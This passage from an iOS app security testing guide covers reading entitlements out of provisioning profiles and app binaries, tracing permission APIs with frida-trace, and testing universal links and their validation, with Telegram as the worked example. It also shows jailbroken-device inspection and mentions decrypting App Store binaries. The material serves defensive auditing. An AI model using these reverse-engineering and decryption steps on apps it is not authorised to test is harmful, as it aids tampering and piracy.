\href{https://developer.apple.com/library/archive/documentation/Miscellaneous/Reference/EntitlementKeyReference/Chapters/EnablingAppSandbox.html\#//apple_ref/doc/uid/TP40011195-CH4-SW19}{Apple
Developer Documentation}, the App Groups entitlement is required to
share information between different apps through IPC or a shared file
container, which means that data can be shared on the device directly
between the apps. This entitlement is also required if an app extension
requires to
\href{https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/ExtensionScenarios.html}{share
information with its containing app}.

Depending on the data to-be-shared it might be more appropriate to share
it using another method such as through a backend where this data could
be potentially verified, avoiding tampering by e.g.~the user himself.

\hypertarget{embedded-provisioning-profile-file}{%
\subparagraph{Embedded Provisioning Profile
File}\label{embedded-provisioning-profile-file}}

When you do not have the original source code, you should analyze the
IPA and search inside for the \emph{embedded provisioning profile} that
is usually located in the root app bundle folder
(\texttt{Payload/\textless{}appname\textgreater{}.app/}) under the name
\texttt{embedded.mobileprovision}.

This file is not a \texttt{.plist}, it is encoded using
\href{https://en.wikipedia.org/wiki/Cryptographic_Message_Syntax}{Cryptographic
Message Syntax}. On macOS you can
\href{https://developer.apple.com/library/archive/technotes/tn2415/_index.html\#//apple_ref/doc/uid/DTS40016427-CH1-PROFILESENTITLEMENTS}{inspect
an embedded provisioning profile's entitlements} using the following
command:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{security}\NormalTok{ cms {-}D {-}i embedded.mobileprovision}
\end{Highlighting}
\end{Shaded}

and then search for the Entitlements key region
(\texttt{\textless{}key\textgreater{}Entitlements\textless{}/key\textgreater{}}).

\hypertarget{entitlements-embedded-in-the-compiled-app-binary}{%
\subparagraph{Entitlements Embedded in the Compiled App
Binary}\label{entitlements-embedded-in-the-compiled-app-binary}}

If you only have the app's IPA or simply the installed app on a
jailbroken device, you normally won't be able to find
\texttt{.entitlements} files. This could be also the case for the
\texttt{embedded.mobileprovision} file. Still, you should be able to
extract the entitlements property lists from the app binary yourself
(which you've previously obtained as explained in the ``iOS Basic
Security Testing'' chapter, section ``Acquiring the App Binary'').

The following steps should work even when targeting an encrypted binary.
If for some reason they don't, you'll have to decrypt and extract the
app with e.g.~Clutch (if compatible with your iOS version),
frida-ios-dump or similar.

Extracting the Entitlements Plist from the App Binary

If you have the app binary in your computer, one approach is to use
binwalk to extract (\texttt{-e}) all XML files (\texttt{-y=xml}):

\begin{verbatim}
$ binwalk -e -y=xml ./Telegram\ X

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1430180       0x15D2A4        XML document, version: "1.0"
1458814       0x16427E        XML document, version: "1.0"
\end{verbatim}

Or you can use radare2 (\texttt{-qc} to \emph{quietly} run one command
and exit) to search all strings on the app binary (\texttt{izz})
containing ``PropertyList'' (\texttt{\textasciitilde{}PropertyList}):

\begin{verbatim}
$ r2 -qc 'izz~PropertyList' ./Telegram\ X

0x0015d2a4 ascii <?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<!DOCTYPE plist PUBLIC
"-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">
...<key>com.apple.security.application-groups</key>\n\t\t<array>
\n\t\t\t<string>group.ph.telegra.Telegraph</string>...

0x0016427d ascii H<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC
"-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n
<dict>\n\t<key>cdhashes</key>...
\end{verbatim}

In both cases (binwalk or radare2) we were able to extract the same two
\texttt{plist} files. If we inspect the first one (0x0015d2a4) we see
that we were able to completely recover the
\href{https://github.com/peter-iakovlev/Telegram-iOS/blob/77ee5c4dabdd6eb5f1e2ff76219edf7e18b45c00/Telegram-iOS/Telegram-iOS-AppStoreLLC.entitlements}{original
entitlements file from Telegram}.

\begin{quote}
Note: the \texttt{strings} command will not help here as it will not be
able to find this information. Better use grep with the \texttt{-a} flag
directly on the binary or use radare2 (\texttt{izz})/rabin2
(\texttt{-zz}).
\end{quote}

If you access the app binary on the jailbroken device (e.g via SSH), you
can use grep with the \texttt{-a,\ -\/-text} flag (treats all files as
ASCII text):

\begin{verbatim}
$ grep -a -A 5 'PropertyList' /var/containers/Bundle/Application/
    15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35/Telegram X.app/Telegram\ X

<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>com.apple.security.application-groups</key>
        <array>
        ...
\end{verbatim}

Play with the \texttt{-A\ num,\ -\/-after-context=num} flag to display
more or less lines. You may use tools like the ones we presented above
as well, if you have them also installed on your jailbroken iOS device.

\begin{quote}
This method should work even if the app binary is still encrypted (it
was tested against several App Store apps).
\end{quote}

\hypertarget{source-code-inspection}{%
\subparagraph{Source Code Inspection}\label{source-code-inspection}}

After having checked the
\texttt{\textless{}appname\textgreater{}.entitlements} file and the
\texttt{Info.plist} file, it is time to verify how the requested
permissions and assigned capabilities are put to use. For this, a source
code review should be enough. However, if you don't have the original
source code, verifying the use of permissions might be specially
challenging as you might need to reverse engineer the app, refer to the
``Dynamic Analysis'' for more details on how to proceed.

When doing a source code review, pay attention to:

\begin{itemize}
\tightlist
\item
  whether the \emph{purpose strings} in the \texttt{Info.plist} file
  match the programmatic implementations.
\item
  whether the registered capabilities are used in such a way that no
  confidential information is leaking.
\end{itemize}

Users can grant or revoke authorization at any time via ``Settings'',
therefore apps normally check the authorization status of a feature
before accessing it. This can be done by using dedicated APIs available
for many system frameworks that provide access to protected resources.

You can use the
\href{https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy/accessing_protected_resources?language=objc\#3037319}{Apple
Developer Documentation} as a starting point. For example:

\begin{itemize}
\item
  Bluetooth: the
  \href{https://developer.apple.com/documentation/corebluetooth/cbmanager/1648600-state?language=objc}{\texttt{state}}
  property of the
  \href{https://developer.apple.com/documentation/corebluetooth/cbcentralmanager?language=objc}{\texttt{CBCentralManager}}
  class is used to check system-authorization status for using Bluetooth
  peripherals.
\item
  Location: search for methods of \texttt{CLLocationManager},
  e.g.~\href{https://developer.apple.com/documentation/corelocation/cllocationmanager/1423648-locationservicesenabled?language=objc}{\texttt{locationServicesEnabled}}.

\begin{verbatim}
func checkForLocationServices() {
    if CLLocationManager.locationServicesEnabled() {
        // Location services are available, so query the user’s location.
    } else {
        // Update your app’s UI to show that the location is unavailable.
    }
}
\end{verbatim}

  See Table1 in
  \href{https://developer.apple.com/documentation/corelocation/adding_location_services_to_your_app}{``Determining
  the Availability of Location Services''} (Apple Developer
  Documentation) for a complete list.
\end{itemize}

Go through the application searching for usages of these APIs and check
what happens to sensitive data that might be obtained from them. For
example, it might be stored or transmitted over the network, if this is
the case, proper data protection and transport security should be
additionally verified.

\hypertarget{dynamic-analysis-62}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-62}}

With help of the static analysis you should already have a list of the
included permissions and app capabilities in use. However, as mentioned
in ``Source Code Inspection'', spotting the sensitive data and APIs
related to those permissions and app capabilities might be a challenging
task when you don't have the original source code. Dynamic analysis can
help here getting inputs to iterate onto the static analysis.

Following an approach like the one presented below should help you
spotting the mentioned sensitive data and APIs:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Consider the list of permissions / capabilities identified in the
  static analysis (e.g.~\texttt{NSLocationWhenInUseUsageDescription}).
\item
  Map them to the dedicated APIs available for the corresponding system
  frameworks (e.g.~\texttt{Core\ Location}). You may use the
  \href{https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy/accessing_protected_resources?language=objc\#3037319}{Apple
  Developer Documentation} for this.
\item
  Trace classes or specific methods of those APIs
  (e.g.~\texttt{CLLocationManager}), for example, using
  \href{https://www.frida.re/docs/frida-trace/}{\texttt{frida-trace}}.
\item
  Identify which methods are being really used by the app while
  accessing the related feature (e.g.~``Share your location'').
\item
  Get a backtrace for those methods and try to build a call graph.
\end{enumerate}

Once all methods were identified, you might use this knowledge to
reverse engineer the app and try to find out how the data is being
handled. While doing that you might spot new methods involved in the
process which you can again feed to step 3. above and keep iterating
between static and dynamic analysis.

In the following example we use Telegram to open the share dialog from a
chat and frida-trace to identify which methods are being called.

First we launch Telegram and start a trace for all methods matching the
string ``authorizationStatus'' (this is a general approach because more
classes apart from \texttt{CLLocationManager} implement this method):

\begin{verbatim}
$ frida-trace -U "Telegram" -m "*[* *authorizationStatus*]"
\end{verbatim}

\begin{quote}
\texttt{-U} connects to the USB device. \texttt{-m} includes an
Objective-C method to the traces. You can use a
\href{https://en.wikipedia.org/wiki/Glob_\%28programming\%29}{glob
pattern} (e.g.~with the "*" wildcard,
\texttt{-m\ "*{[}*\ *authorizationStatus*{]}"} means ``include any
Objective-C method of any class containing `authorizationStatus'\,'').
Type \texttt{frida-trace\ -h} for more information.
\end{quote}

Now we open the share dialog:

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/e23c83cdb5b3794160113d98a0bccc36eb3be1b6.png}
\caption{Images/Chapters/0x06h/telegram\_share\_something.png}
\end{figure}

The following methods are displayed:

\begin{verbatim}
  1942 ms  +[PHPhotoLibrary authorizationStatus]
  1959 ms  +[TGMediaAssetsLibrary authorizationStatusSignal]
  1959 ms     | +[TGMediaAssetsModernLibrary authorizationStatusSignal]
\end{verbatim}

If we click on \textbf{Location}, another method will be traced:

\begin{verbatim}
 11186 ms  +[CLLocationManager authorizationStatus]
 11186 ms     | +[CLLocationManager _authorizationStatus]
 11186 ms     |    | +[CLLocationManager _authorizationStatusForBundleIdentifier:0x0 bundle:0x0]
\end{verbatim}

Use the auto-generated stubs of frida-trace to get more information like
the return values and a backtrace. Do the following modifications to the
JavaScript file below (the path is relative to the current directory):

\begin{Shaded}
\begin{Highlighting}[]

\CommentTok{// \_\_handlers\_\_/\_\_CLLocationManager\_authorizationStatus\_.js}

\NormalTok{  onEnter}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (log}\OperatorTok{,}\NormalTok{ args}\OperatorTok{,}\NormalTok{ state) }\OperatorTok{\{}
    \AttributeTok{log}\NormalTok{(}\StringTok{"+[CLLocationManager authorizationStatus]"}\NormalTok{)}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"Called from:}\SpecialCharTok{\textbackslash{}n}\StringTok{"} \OperatorTok{+}
        \VariableTok{Thread}\NormalTok{.}\AttributeTok{backtrace}\NormalTok{(}\KeywordTok{this}\NormalTok{.}\AttributeTok{context}\OperatorTok{,} \VariableTok{Backtracer}\NormalTok{.}\AttributeTok{ACCURATE}\NormalTok{)}
\NormalTok{        .}\AttributeTok{map}\NormalTok{(}\VariableTok{DebugSymbol}\NormalTok{.}\AttributeTok{fromAddress}\NormalTok{).}\AttributeTok{join}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}n\textbackslash{}t}\StringTok{"}\NormalTok{) }\OperatorTok{+} \StringTok{"}\SpecialCharTok{\textbackslash{}n}\StringTok{"}\NormalTok{)}\OperatorTok{;}
  \OperatorTok{\},}
\NormalTok{  onLeave}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (log}\OperatorTok{,}\NormalTok{ retval}\OperatorTok{,}\NormalTok{ state) }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}RET :\textquotesingle{}} \OperatorTok{+} \VariableTok{retval}\NormalTok{.}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
  \OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

Clicking again on ``Location'' reveals more information:

\begin{verbatim}
  3630 ms  -[CLLocationManager init]
  3630 ms     | -[CLLocationManager initWithEffectiveBundleIdentifier:0x0 bundle:0x0]
  3634 ms  -[CLLocationManager setDelegate:0x14c9ab000]
  3641 ms  +[CLLocationManager authorizationStatus]
RET: 0x4
  3641 ms  Called from:
0x1031aa158 TelegramUI!+[TGLocationUtils requestWhenInUserLocationAuthorizationWithLocationManager:]
    0x10337e2c0 TelegramUI!-[TGLocationPickerController initWithContext:intent:]
    0x101ee93ac TelegramUI!0x1013ac
\end{verbatim}

We see that \texttt{+{[}CLLocationManager\ authorizationStatus{]}}
returned \texttt{0x4}
(\href{https://developer.apple.com/documentation/corelocation/clauthorizationstatus/authorizedwheninuse}{CLAuthorizationStatus.authorizedWhenInUse})
and was called by
\texttt{+{[}TGLocationUtils\ requestWhenInUserLocationAuthorizationWithLocationManager:{]}}.
As we anticipated before, you might use this kind of information as an
entry point when reverse engineering the app and from there get inputs
(e.g.~names of classes or methods) to keep feeding the dynamic analysis.

Next, there is a \emph{visual} way to inspect the status of some app
permissions when using the iPhone/iPad by opening ``Settings'' and
scrolling down until you find the app you're interested in. When
clicking on it, this will open the ``ALLOW APP\_NAME TO ACCESS'' screen.
However, not all permissions might be displayed yet. You will have to
\emph{trigger} them in order to be listed on that screen.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/0b7f0c46917539212ca389968c59a617a2f79b41.png}
\caption{Images/Chapters/0x06h/settings\_allow\_screen.png}
\end{figure}

For example, in the previous example, the ``Location'' entry was not
being listed until we triggered the permission dialogue for the first
time. Once we did it, no matter if we allowed the access or not, the the
``Location'' entry will be displayed.

\hypertarget{testing-for-sensitive-functionality-exposure-through-ipc-mstg-platform-4-1}{%
\subsubsection{Testing for Sensitive Functionality Exposure Through IPC
(MSTG-PLATFORM-4)}\label{testing-for-sensitive-functionality-exposure-through-ipc-mstg-platform-4-1}}

During implementation of a mobile application, developers may apply
traditional techniques for IPC (such as using shared files or network
sockets). The IPC system functionality offered by mobile application
platforms should be used because it is much more mature than traditional
techniques. Using IPC mechanisms with no security in mind may cause the
application to leak or expose sensitive data.

In contrast to Android's rich Inter-Process Communication (IPC)
capability, iOS offers some rather limited options for communication
between apps. In fact, there's no way for apps to communicate directly.
In this section we will present the different types of indirect
communication offered by iOS and how to test them. Here's an overview:

\begin{itemize}
\tightlist
\item
  Custom URL Schemes
\item
  Universal Links
\item
  UIActivity Sharing
\item
  App Extensions
\item
  UIPasteboard
\end{itemize}

\hypertarget{custom-url-schemes}{%
\paragraph{Custom URL Schemes}\label{custom-url-schemes}}

Please refer to the section
``\protect\hyperlink{testing-custom-url-schemes-mstg-platform-3}{Testing
Custom URL Schemes}'' for more information on what custom URL schemes
are and how to test them.

\hypertarget{universal-links}{%
\paragraph{Universal Links}\label{universal-links}}

\hypertarget{overview-60}{%
\subparagraph{Overview}\label{overview-60}}

Universal links are the iOS equivalent to Android App Links (aka.
Digital Asset Links) and are used for deep linking. When tapping a
universal link (to the app's website), the user will seamlessly be
redirected to the corresponding installed app without going through
Safari. If the app isn't installed, the link will open in Safari.

Universal links are standard web links (HTTP/HTTPS) and are not to be
confused with custom URL schemes, which originally were also used for
deep linking.

For example, the Telegram app supports both custom URL schemes and
universal links:

\begin{itemize}
\tightlist
\item
  \texttt{tg://resolve?domain=fridadotre} is a custom URL scheme and
  uses the \texttt{tg://} scheme.
\item
  \texttt{https://telegram.me/fridadotre} is a universal link and uses
  the \texttt{https://} scheme.
\end{itemize}

Both result in the same action, the user will be redirected to the
specified chat in Telegram (``fridadotre'' in this case). However,
universal links give several key benefits that are not applicable when
using custom URL schemes and are the recommended way to implement deep
linking, according to the
\href{https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html}{Apple
Developer Documentation}. Specifically, universal links are:

\begin{itemize}
\tightlist
\item
  \textbf{Unique}: Unlike custom URL schemes, universal links can't be
  claimed by other apps, because they use standard HTTP or HTTPS links
  to the app's website. They were introduced as a way to \emph{prevent}
  URL scheme hijacking attacks (an app installed after the original app
  may declare the same scheme and the system might target all new
  requests to the last installed app).
\item
  \textbf{Secure}: When users install the app, iOS downloads and checks
  a file (the Apple App Site Association or AASA) that was uploaded to
  the web server to make sure that the website allows the app to open
  URLs on its behalf. Only the legitimate owners of the URL can upload
  this file, so the association of their website with the app is secure.
\item
  \textbf{Flexible}: Universal links work even when the app is not
  installed. Tapping a link to the website would open the content in
  Safari, as users expect.
\item
  \textbf{Simple}: One URL works for both the website and the app.
\item
  \textbf{Private}: Other apps can communicate with the app without
  needing to know whether it is installed.
\end{itemize}

\hypertarget{static-analysis-67}{%
\subparagraph{Static Analysis}\label{static-analysis-67}}

Testing universal links on a static approach includes doing the
following:

\begin{itemize}
\tightlist
\item
  Checking the Associated Domains entitlement
\item
  Retrieving the Apple App Site Association file
\item
  Checking the link receiver method
\item
  Checking the data handler method
\item
  Checking if the app is calling other app's universal links
\end{itemize}

Checking the Associated Domains Entitlement

Universal links require the developer to add the Associated Domains
entitlement and include in it a list of the domains that the app
supports.

In Xcode, go to the \textbf{Capabilities} tab and search for
\textbf{Associated Domains}. You can also inspect the
\texttt{.entitlements} file looking for
\texttt{com.apple.developer.associated-domains}. Each of the domains
must be prefixed with \texttt{applinks:}, such as
\texttt{applinks:www.mywebsite.com}.

Here's an example from Telegram's \texttt{.entitlements} file:

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{<key>}\NormalTok{com.apple.developer.associated{-}domains}\KeywordTok{</key>}
    \KeywordTok{<array>}
        \KeywordTok{<string>}\NormalTok{applinks:telegram.me}\KeywordTok{</string>}
        \KeywordTok{<string>}\NormalTok{applinks:t.me}\KeywordTok{</string>}
    \KeywordTok{</array>}
\end{Highlighting}
\end{Shaded}

More detailed information can be found in the
\href{https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html\#//apple_ref/doc/uid/TP40016308-CH12-SW2}{archived
Apple Developer Documentation}.

If you don't have the original source code you can still search for
them, as explained in ``Entitlements Embedded in the Compiled App
Binary''.

Retrieving the Apple App Site Association File

Try to retrieve the \texttt{apple-app-site-association} file from the
server using the associated domains you got from the previous step. This
file needs to be accessible via HTTPS, without any redirects, at
\texttt{https://\textless{}domain\textgreater{}/apple-app-site-association}
or
\texttt{https://\textless{}domain\textgreater{}/.well-known/apple-app-site-association}.

You can retrieve it yourself with your browser or use the
\href{https://branch.io/resources/aasa-validator/}{Apple App Site
Association (AASA) Validator}. After entering the domain, it will
display the file, verify it for you and show the results (e.g.~if it is
not being properly served over HTTPS). See the following example from
\href{https://www.apple.com/.well-known/apple-app-site-association}{apple.com}:

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/d8998c087e399a85eecdd91878167c02546f33d5.png}
\caption{Images/Chapters/0x06h/apple-app-site-association-file\_validation.png}
\end{figure}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{\{}
    \DataTypeTok{"activitycontinuation"}\FunctionTok{:} \FunctionTok{\{}
    \DataTypeTok{"apps"}\FunctionTok{:} \OtherTok{[}
        \StringTok{"W74U47NE8E.com.apple.store.Jolly"}
    \OtherTok{]}
    \FunctionTok{\},}
    \DataTypeTok{"applinks"}\FunctionTok{:} \FunctionTok{\{}
        \DataTypeTok{"apps"}\FunctionTok{:} \OtherTok{[]}\FunctionTok{,}
        \DataTypeTok{"details"}\FunctionTok{:} \OtherTok{[}
            \FunctionTok{\{}
            \DataTypeTok{"appID"}\FunctionTok{:} \StringTok{"W74U47NE8E.com.apple.store.Jolly"}\FunctionTok{,}
            \DataTypeTok{"paths"}\FunctionTok{:} \OtherTok{[}
                \StringTok{"NOT /shop/buy{-}iphone/*"}\OtherTok{,}
                \StringTok{"NOT /us/shop/buy{-}iphone/*"}\OtherTok{,}
                \StringTok{"/xc/*"}\OtherTok{,}
                \StringTok{"/shop/buy{-}*"}\OtherTok{,}
                \StringTok{"/shop/product/*"}\OtherTok{,}
                \StringTok{"/shop/bag/shared\_bag/*"}\OtherTok{,}
                \StringTok{"/shop/order/list"}\OtherTok{,}
                \StringTok{"/today"}\OtherTok{,}
                \StringTok{"/shop/watch/watch{-}accessories"}\OtherTok{,}
                \StringTok{"/shop/watch/watch{-}accessories/*"}\OtherTok{,}
                \StringTok{"/shop/watch/bands"}\OtherTok{,}
            \OtherTok{]} \FunctionTok{\}} \OtherTok{]} \FunctionTok{\}}
\FunctionTok{\}}
\end{Highlighting}
\end{Shaded}

The ``details'' key inside ``applinks'' contains a JSON representation
of an array that might contain one or more apps. The ``appID'' should
match the ``application-identifier'' key from the app's entitlements.
Next, using the ``paths'' key, the developers can specify certain paths
to be handled on a per app basis. Some apps, like Telegram use a
standalone * (\texttt{"paths":\ {[}"*"{]}}) in order to allow all
possible paths. Only if specific areas of the website should
\textbf{not} be handled by some app, the developer can restrict access
by excluding them by prepending a \texttt{"NOT\ "} (note the whitespace
after the T) to the corresponding path. Also remember that the system
will look for matches by following the order of the dictionaries in the
array (first match wins).

This path exclusion mechanism is not to be seen as a security feature
but rather as a filter that developer might use to specify which apps
open which links. By default, iOS does not open any unverified links.

Remember that universal links verification occurs at installation time.
iOS retrieves the AASA file for the declared domains (\texttt{applinks})
in its \texttt{com.apple.developer.associated-domains} entitlement. iOS
will refuse to open those links if the verification did not succeed.
Some reasons to fail verification might include:

\begin{itemize}
\tightlist
\item
  The AASA file is not served over HTTPS.
\item
  The AASA is not available.
\item
  The \texttt{appID}s do not math (this would be the case of a
  \emph{malicious} app. iOS would successfully prevent any possible
  hijacking attacks
\end{itemize}

Checking the Link Receiver Method

In order to receive links and handle them appropriately, the app
delegate has to implement
\href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623072-application}{\texttt{application:continueUserActivity:restorationHandler:}}.
If you have the original project try searching for this method.

Please note that if the app uses
\href{https://developer.apple.com/documentation/uikit/uiapplication/1648685-openurl?language=objc}{\texttt{openURL:options:completionHandler:}}
to open a universal link to the app's website, the link won't open in
the app. As the call originates from the app, it won't be handled as a
universal link.

\begin{quote}
From Apple Docs: When iOS launches your app after a user taps a
universal link, you receive an \texttt{NSUserActivity} object with an
\texttt{activityType} value of \texttt{NSUserActivityTypeBrowsingWeb}.
The activity object's \texttt{webpageURL} property contains the URL that
the user is accessing. The webpage URL property always contains an HTTP
or HTTPS URL, and you can use \texttt{NSURLComponents} APIs to
manipulate the components of the URL. {[}\ldots{]} To protect users'
privacy and security, you should not use HTTP when you need to transport
data; instead, use a secure transport protocol such as HTTPS.
\end{quote}

From the note above we can highlight that:

\begin{itemize}
\tightlist
\item
  The mentioned \texttt{NSUserActivity} object comes from the
  \texttt{continueUserActivity} parameter, as seen in the method above.
\item
  The scheme of the \texttt{webpageURL} must be HTTP or HTTPS (any other
  scheme should throw an exception). The
  \href{https://developer.apple.com/documentation/foundation/urlcomponents/1779624-scheme}{\texttt{scheme}
  instance property} of \texttt{URLComponents} /
  \texttt{NSURLComponents} can be used to verify this.
\end{itemize}

If you don't have the original source code you can use radare2 or rabin2
to search the binary strings for the link receiver method:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{rabin2}\NormalTok{ {-}zq Telegram\textbackslash{} X.app/Telegram\textbackslash{} X }\KeywordTok{|} \FunctionTok{grep}\NormalTok{ restorationHan}

\ExtensionTok{0x1000deea9}\NormalTok{ 53 52 application:continueUserActivity:restorationHandler:}
\end{Highlighting}
\end{Shaded}

Checking the Data Handler Method

You should check how the received data is validated. Apple
\href{https://developer.apple.com/documentation/uikit/core_app/allowing_apps_and_websites_to_link_to_your_content/handling_universal_links}{explicitly
warns about this}:

\begin{quote}
Universal links offer a potential attack vector into your app, so make
sure to validate all URL parameters and discard any malformed URLs. In
addition, limit the available actions to those that do not risk the
user's data. For example, do not allow universal links to directly
delete content or access sensitive information about the user. When
testing your URL-handling code, make sure your test cases include
improperly formatted URLs.
\end{quote}

As stated in the
\href{https://developer.apple.com/documentation/uikit/core_app/allowing_apps_and_websites_to_link_to_your_content/handling_universal_links}{Apple
Developer Documentation}, when iOS opens an app as the result of a
universal link, the app receives an \texttt{NSUserActivity} object with
an \texttt{activityType} value of
\texttt{NSUserActivityTypeBrowsingWeb}. The activity object's
\texttt{webpageURL} property contains the HTTP or HTTPS URL that the
user accesses. The following example in Swift verifies exactly this
before opening the URL:

\begin{verbatim}
func application(_ application: UIApplication, continue userActivity: NSUserActivity,
                 restorationHandler: @escaping ([UIUserActivityRestoring]?) -> Void) -> Bool {
    // ...
    if userActivity.activityType == NSUserActivityTypeBrowsingWeb, let url = userActivity.webpageURL {
        application.open(url, options: [:], completionHandler: nil)
    }

    return true
}
\end{verbatim}

In addition, remember that if the URL includes parameters, they should
not be trusted before being carefully sanitized and validated (even when
including a whitelist of trusted domains here). For example, they might
have been spoofed by an attacker or might include malformed data. If
that is the case, the whole URL and therefore the universal link request
must be discarded.

The \texttt{NSURLComponents} API can be used to parse and manipulate the
components of the URL. This can be also part of the method
\texttt{application:continueUserActivity:restorationHandler:} itself or
might occur on a separate method being called from it. The following
\href{https://developer.apple.com/documentation/uikit/core_app/allowing_apps_and_websites_to_link_to_your_content/handling_universal_links\#3001935}{example}
demonstrates this:

\begin{verbatim}
func application(_ application: UIApplication,
                 continue userActivity: NSUserActivity,
                 restorationHandler: @escaping ([Any]?) -> Void) -> Bool {
    guard userActivity.activityType == NSUserActivityTypeBrowsingWeb,
        let incomingURL = userActivity.webpageURL,
        let components = NSURLComponents(url: incomingURL, resolvingAgainstBaseURL: true),
        let path = components.path,
        let params = components.queryItems else {
        return false
    }

    if let albumName = params.first(where: { $0.name == "albumname" })?.value,
        let photoIndex = params.first(where: { $0.name == "index" })?.value {
        // Interact with album name and photo index

        return true

    } else {
        // Handle when album and/or album name or photo index missing

        return false
    }
}
\end{verbatim}

Finally, as stated above, be sure to verify that the actions triggered
by the URL do not expose sensitive information or risk the user's data
on any way.

Checking if the App is Calling Other App's Universal Links

An app might be calling other apps via universal links in order to
simply trigger some actions or to transfer information, in that case, it
should be verified that it is not leaking sensitive information.

If you have the original source code, you can search it for the
\texttt{openURL:options:completionHandler:} method and check the data
being handled.

\begin{quote}
Note that the \texttt{openURL:options:completionHandler:} method is not
only used to open universal links but also to call custom URL schemes.
\end{quote}

This is an example from the Telegram app:

\begin{verbatim}
}, openUniversalUrl: { url, completion in
    if #available(iOS 10.0, *) {
        var parsedUrl = URL(string: url)
        if let parsed = parsedUrl {
            if parsed.scheme == nil || parsed.scheme!.isEmpty {
                parsedUrl = URL(string: "https://\(url)")
            }
        }

        if let parsedUrl = parsedUrl {
            return UIApplication.shared.open(parsedUrl,
                        options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],
                        completionHandler: { value in completion.completion(value)}
            )
\end{verbatim}

Note how the app adapts the \texttt{scheme} to ``https'' before opening
it and how it uses the option
\texttt{UIApplicationOpenURLOptionUniversalLinksOnly:\ true} that
\href{https://developer.apple.com/documentation/uikit/uiapplicationopenurloptionuniversallinksonly?language=objc}{opens
the URL only if the URL is a valid universal link and there is an
installed app capable of opening that URL}.

If you don't have the original source code, search in the symbols and in
the strings of the app binary. For example, we will search for
Objective-C methods that contain ``openURL'':

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{rabin2}\NormalTok{ {-}zq Telegram\textbackslash{} X.app/Telegram\textbackslash{} X }\KeywordTok{|} \FunctionTok{grep}\NormalTok{ openURL}

\ExtensionTok{0x1000dee3f}\NormalTok{ 50 49 application:openURL:sourceApplication:annotation:}
\ExtensionTok{0x1000dee71}\NormalTok{ 29 28 application:openURL:options:}
\ExtensionTok{0x1000df2c9}\NormalTok{ 9 8 openURL:}
\ExtensionTok{0x1000df772}\NormalTok{ 35 34 openURL:options:completionHandler:}
\end{Highlighting}
\end{Shaded}

As expected, \texttt{openURL:options:completionHandler:} is among the
ones found (remember that it might be also present because the app opens
custom URL schemes). Next, to ensure that no sensitive information is
being leaked you'll have to perform dynamic analysis and inspect the
data being transmitted. Please refer to
``\protect\hyperlink{identifying-and-hooking-the-url-handler-method}{Identifying
and Hooking the URL Handler Method}'' in the ``Dynamic Analysis'' of
``Testing Custom URL Schemes'' section for some examples on hooking and
tracing this method.

\hypertarget{dynamic-analysis-63}{%
\subparagraph{Dynamic Analysis}\label{dynamic-analysis-63}}

If an app is implementing universal links, you should have the following
outputs from the static analysis:

\begin{itemize}
\tightlist
\item
  the associated domains
\item
  the Apple App Site Association file
\item
  the link receiver method
\item
  the data handler method
\end{itemize}

You can use this now to dynamically test them:

\begin{itemize}
\tightlist
\item
  Triggering universal links
\item
  Identifying valid universal links
\item
  Tracing the link receiver method
\item
  Checking how the links are opened
\end{itemize}

Triggering Universal Links

Unlike custom URL schemes, unfortunately you cannot test universal links
from Safari just by typing them in the search bar directly as this is
not allowed by Apple. But you can test them anytime using other apps
like the Notes app:

\begin{itemize}
\tightlist
\item
  Open the Notes app and create a new note.
\item
  Write the links including the domain.
\item
  Leave the editing mode in the Notes app.
\item
  Long press the links to open them (remember that a standard click
  triggers the default option).
\end{itemize}

\begin{quote}
To do it from Safari you will have to find an existing link on a website
that once clicked, it will be recognized as a Universal Link. This can
be a bit time consuming.
\end{quote}

Alternatively you can also use Frida for this, see the section
``\protect\hyperlink{performing-url-requests}{Performing URL Requests}''
for more details.

Identifying Valid Universal Links

First of all we will see the difference between opening an allowed
Universal Link and one that shouldn't be allowed.

From the \texttt{apple-app-site-association} of apple.com we have seen
above we chose the following paths:

\begin{Shaded}
\begin{Highlighting}[]
\ErrorTok{"paths":} \OtherTok{[}
    \StringTok{"NOT /shop/buy{-}iphone/*"}\OtherTok{,}
    \ErrorTok{...}
    \StringTok{"/today"}\OtherTok{,}
\end{Highlighting}
\end{Shaded}

One of them should offer the ``Open in app'' option and the other should
not.

